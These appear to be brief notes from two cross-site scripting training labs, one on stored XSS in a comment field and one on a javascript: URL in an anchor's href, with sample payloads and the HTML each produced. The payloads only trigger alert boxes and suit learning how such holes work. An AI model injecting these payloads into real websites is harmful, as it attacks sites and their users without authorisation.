## Lab1 - Stored
# comment section : able to add the html tag <b>comment</b>
<script>alert('xxxx')</script>
<img src="x" onerror="alert('xss')">

## Lab2 - XSS into anchor href attribute with double quotes HTML-encoded
When the comments are posted the anchor tag will only create when you provide input to the website field:badal@test.com, if its not provided then name is not clickable (&lt;mama - printed for input <mama for name field)

* payload:
javascript:alert('xss')

Output:
<a id="author" href="badal@test.com">&lt;rini</a>
<a id="author" href="javascript:alert('xss')">roja</a> 
<a id="author" href="<script>alert(1)</script>">&lt;name1</a>
